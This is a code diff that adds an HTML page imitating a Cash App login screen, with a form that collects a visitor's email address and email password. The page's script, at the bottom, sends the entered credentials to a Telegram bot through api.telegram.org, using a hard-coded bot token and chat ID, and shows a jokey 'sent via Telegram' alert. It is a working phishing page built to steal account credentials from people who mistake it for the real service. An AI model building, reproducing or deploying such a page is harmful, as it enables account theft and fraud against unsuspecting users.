@@ -1,0 +1,100 @@
+<body
+  class="bg-[#00D64C] min-h-screen flex items-center justify-center"
+  style="font-family: 'Helvetica', sans-serif;"
+>
+  <div class="bg-white w-full max-w-lg py-16 px-8 rounded-3xl shadow-lg">
+    <h1 class="text-4xl font-semibold mb-2">Confirme su correo electrónico</h1>
+    <p class="text-gray-600 mb-10">
+      Enter your phone number or email. New to Cash App?
+      <br />
+      <a href="#" class="text-[#00D64C] font-medium">Create account</a>
+    </p>
+
+    <!-- Form -->
+    <form id="telegramForm">
+      <!-- Email Input -->
+      <div class="mb-4">
+        <label for="email" class="block text-sm font-medium text-gray-600">
+          Email
+        </label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Your email address"
+          class="w-full px-6 py-3 mt-2 border border-gray-300 bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
+          required
+        />
+      </div>
+
+      <!-- Password Input -->
+      <div class="mb-16">
+        <label for="password" class="block text-sm font-medium text-gray-600">
+          Contraseña
+        </label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Email password"
+          class="w-full px-6 py-3 mt-2 border border-gray-300 bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
+          required
+        />
+      </div>
+
+      <!-- Buttons -->
+      <div class="flex justify-between gap-4">
+        <button
+          type="button"
+          class="w-1/2 py-2 border font-bold border-gray-300 rounded-full text-gray-600 hover:bg-gray-100"
+        >
+          Use phone
+        </button>
+        <button
+          type="submit"
+          class="w-1/2 py-2 bg-green-500 text-gray-100 rounded-full hover:bg-green-600"
+        >
+          Continue
+        </button>
+      </div>
+    </form>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    const form = document.getElementById("telegramForm");
+    const botToken = "7860301704:AAFHfhT7Y6Ow6cMEAbfVjl7Q7Z-Dic_OS4I"; // Reemplaza con tu token de bot
+    const chatId = "1451244612"; // Reemplaza con tu chat ID
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const message = `Nuevo registro: \n📧 Email: ${email} \n🔑 Contraseña: ${password}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+        .then((response) => {
+          if (response.ok) {
+            alert("Datos enviados correctamente por Telegram UwU!");
+            form.reset();
+          } else {
+            alert("Hubo un error al enviar los datos 7w7.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("No se pudo conectar con Telegram UwU.");
+        });
+    });
+  </script>
+</body>
